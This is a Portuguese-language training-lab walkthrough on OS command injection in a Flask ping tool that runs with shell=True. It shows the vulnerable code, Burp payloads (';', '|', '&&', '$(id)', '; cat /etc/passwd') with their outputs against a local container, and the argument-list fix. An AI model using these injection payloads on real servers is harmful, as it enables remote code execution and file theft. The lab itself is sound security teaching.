# Walkthrough — command-injection-basic

## 1. Contexto

A app é uma "ferramenta de ping de rede". Você digita um host em `/`, o form dispara um request `GET /ping?host=<host>`, e o servidor roda `ping -c 1 <host>` e te mostra o output do comando — o tipo de checagem de alcance que existe em painéis de admin e status pages por todo lado.

Diferente de XSS, este átomo é trabalhado inteiramente no Burp. O comando roda no servidor e o output volta direto na resposta HTTP, então não há nada pra executar num browser — você vê `root`, ou `/etc/passwd`, ali no painel de response do Repeater.

## 2. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/ping` monta o comando assim:

```python
host = request.args.get("host", "")
# VULNERABLE: user input concatenated into a shell command string
cmd = f"ping -c 1 {host}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
output = result.stdout + result.stderr
```

O valor de `host` vem direto da query string e é colado numa string de comando via f-string. Essa string é então entregue ao `subprocess.run(..., shell=True)` — e `shell=True` faz o Python rodar como `/bin/sh -c "ping -c 1 <host>"`. Um shell não só roda o `ping`; ele *parseia* a linha inteira primeiro, honrando todo metacaractere que encontrar — `;`, `|`, `&&`, `$(...)`, backticks. Tudo que o cliente mandar depois de `ping -c 1 ` vira parte de um programa de shell.

É a mesma auditoria source → sink dos outros átomos de injection, apontada pra um interpretador novo. O grep barato de first-pass aqui é `shell=True`, `os.system(`, `os.popen(`:

```bash
grep -rn 'shell=True\|os.system(\|os.popen(' .
```

Duas coisas que a app faz *certo*, pra você não confundir com o bug:

- **O output é HTML-escaped.** O `result.html` renderiza `<pre>{{ output }}</pre>` pelo autoescape default do Jinja (sem `|safe`). Se não fizesse, um payload como `; echo '<script>...'` transformaria o output do comando em HTML vivo — um reflected XSS empilhado por cima do command injection. Escapar o output mantém este átomo com exatamente um bug. **Não** é o fix de command injection.
- **O timeout de 10 segundos é higiene, não defesa.** `subprocess.run(..., timeout=10)` dentro de um `try/except subprocess.TimeoutExpired` faz um `; sleep 999` ou um `; cat` (que bloqueia em stdin) morrer depois de 10s com `command timed out after 10s`, em vez de pendurar o lab. É ortogonal à vulnerabilidade e ao fix, e é idêntico nas duas versões — um `; whoami` retorna em milissegundos, longe do limite.

A view `/ping` também ecoa o comando montado de volta num `<pre>` de debug, o que facilita seguir este lab — num app real você inferiria o formato do comando pelo comportamento.

## 3. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte o browser pra ele. Visite <http://127.0.0.1:8009/>, submeta `127.0.0.1` pelo form uma vez pra capturar o tráfego, depois clique com o botão direito no request `GET /ping?host=127.0.0.1` em **Proxy → HTTP history** e escolha **Send to Repeater**.

### Baseline — a ferramenta fazendo seu trabalho

Envie o request capturado como está e leia a resposta. O bloco "Executed command" mostra `ping -c 1 127.0.0.1`, e o output é um ping comum (seus tempos vão variar):

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
```

É a feature funcionando como deveria. Agora subverta ela.

### Uma nota sobre URL encoding

Dois caracteres mordem quando você põe um payload de shell na query string:

- **Espaços têm que ser `%20`.** Request lines de HTTP são `METHOD SP URI SP VERSION` — um espaço literal dentro da URI faz o server enxergar quatro tokens e responder **400 Bad Request** antes do seu comando rodar. `; whoami` vai no fio como `;%20whoami`.
- **`&` tem que ser `%26`.** Um `&` cru numa query string *inicia um novo parâmetro*: `?host=127.0.0.1 && id` seria dividido, `host` terminaria em `127.0.0.1 `, e sua injection desmontaria. Pra encadear com `&&`, mande `%26%26`. (É o trap deste átomo, do mesmo jeito que `+`→`%2B` é o trap num corpo de form.)

Os outros metacaracteres — `;`, `|`, `$`, `(`, `)` — passam de boa no valor da query, e os passos abaixo os mostram crus, pra leitura. Se seu setup for estrito, ou você simplesmente não quiser pensar nisso, cole o payload decoded no Repeater, selecione ele e aperte **Ctrl+U**: o Burp encoda tudo, `&` e espaços inclusos. Cada passo mostra um **Payload** (decoded, pra leitura) e uma **Request line** (pronta pra colar).

### Passo 1 — Confirmar o injection point

Payload:

```
127.0.0.1; whoami
```

Request line no Repeater:

```
GET /ping?host=127.0.0.1;%20whoami HTTP/1.1
Host: 127.0.0.1:8009
```

Response — o bloco "Executed command" mostra seu input virando a linha de comando, e o output carrega tanto o ping *quanto* o resultado de um segundo comando:

```
Executed command:
ping -c 1 127.0.0.1; whoami

Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
root
```

Aí está — `root`. O `;` encerrou o comando `ping` e o shell rodou `whoami` como um segundo comando. Seu input não era dado; era **código pro shell**. (E o `root` não é engano: o container roda como root, então seu comando roda com privilégio total — mais sobre isso no Passo 3.)

### Passo 2 — Não é o ponto e vírgula: o sink é o shell

A conclusão errada natural é "a app devia ter bloqueado o `;`". Não devia importar qual caractere você usa — o *shell* inteiro está parseando seu input como código. Prove com três metacaracteres diferentes, nenhum deles um ponto e vírgula:

**Pipe** — o output do `ping` é canalizado pro `id` (que ignora stdin e imprime a identidade):

```
Payload:       127.0.0.1 | id
Request line:  GET /ping?host=127.0.0.1%20|%20id HTTP/1.1

Output:
uid=0(root) gid=0(root) groups=0(root)
```

**Lista AND** — o `id` roda depois do `ping` ter sucesso. Repare que o `&&` **tem** que ser mandado como `%26%26`:

```
Payload:       127.0.0.1 && id
Request line:  GET /ping?host=127.0.0.1%20%26%26%20id HTTP/1.1

Output:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
... ping statistics ...
uid=0(root) gid=0(root) groups=0(root)
```

**Command substitution** — o shell roda `$(id)` primeiro e splica o output dele no argumento:

```
Payload:       127.0.0.1$(id)
Request line:  GET /ping?host=127.0.0.1$(id) HTTP/1.1

Output:
ping: groups=0(root): Name or service not known
```

Esse último vale ler com atenção: o `ping` nunca resolve um host, mas `groups=0(root)` — um pedaço do output do `id` — aparece no erro dele. O shell executou o `$(id)` *antes* do `ping` rodar e colou o resultado no hostname; o `ping` então falhou no nome mutilado. O comando rodou mesmo assim.

`;`, `|`, `&&`, `$(...)` — quatro caracteres, uma causa raiz: o shell interpreta input do atacante como código. Bloquear um caractere só empurra o atacante pro próximo. No `sqli-union-basic` a lição era "escapar aspas é jogo perdido — parametrize"; aqui é "escapar metacaracteres é jogo perdido — tire o shell". A seção 4 faz exatamente isso.

### Passo 3 — Execução de comando completa: ler um arquivo arbitrário

Encadear `whoami` prova a execução. Ler um arquivo prova o alcance — o atacante roda qualquer comando que o usuário do servidor consegue:

```
Payload:       127.0.0.1; cat /etc/passwd
Request line:  GET /ping?host=127.0.0.1;%20cat%20/etc/passwd HTTP/1.1
```

O output carrega o ping, depois o `/etc/passwd` inteiro do container:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
... ping statistics ...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**O que isso é de verdade.** Aqui o comando roda dentro de um container descartável e isolado, então ler `/etc/passwd` como `root` é inofensivo — esse isolamento é a rede de segurança deste lab. Num alvo real isso é **Remote Code Execution**: o atacante roda comandos arbitrários como o usuário do servidor, na máquina do servidor. É o topo da escala de severidade de injection — o `whoami`/`cat` inócuo daqui representa controle total do host. Mantenha seus payloads demonstrativos (ler um arquivo, imprimir um id); nunca há motivo pra apelar pra `rm -rf`, fork bomb, ou qualquer coisa destrutiva, mesmo num container.

### Por que isso é command injection (e como se compara a SQLi e XSS)

No `sqli-union-basic` o input não sanitizado ia pra **SQL engine**, e o atacante lia **dado** do banco. Nos átomos de XSS ia pro **parser HTML/JS do browser**, e o código rodava no **browser da vítima**. Aqui ele vai pro **shell do OS**, e o comando roda **no próprio servidor**: `whoami` retorna `root`, `cat /etc/passwd` devolve o arquivo. Mesma causa raiz nos três — input concatenado numa string que um interpretador parseia — só que o interpretador agora é o shell, e o resultado é Remote Code Execution: o pior caso da família. E o fix rima com o do SQLi: assim como a query parametrizada separou SQL de dado, uma lista de argumentos separa o comando do seu argumento, tirando o shell da jogada por completo.

## 4. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. Em resumo: a versão fixed chama `subprocess.run(["ping", "-c", "1", host])` — uma lista de argumentos, sem `shell=True`. O Python entrega esses itens exatos pro `execvp` e o kernel roda o `ping` direto; **nenhum `/bin/sh` é spawnado pra parsear nada.** `host` é sempre um argumento único e inerte do `ping`, então `127.0.0.1; whoami` vira um "hostname" literal que o `ping` tenta resolver e não consegue:

```
ping: 127.0.0.1; whoami: Name or service not known
```

Rode todos os payloads da seção 3 contra <http://127.0.0.1:8109/ping> pra confirmar: cada um retorna `ping: <seu input>: Name or service not known`, nenhum segundo comando executa, nada vaza. Escapar ou blocklistar metacaracteres seria jogo perdido — o fix é nunca deixar um shell ver o input. Validação de input (uma allowlist tipo `^[a-zA-Z0-9.-]+$`) vale como defense-in-depth — ela também barra um `-` inicial que poderia virar argument injection no `ping` — mas é uma segunda camada, não o fix; o `DIFF.pt-BR.md` cobre o porquê.
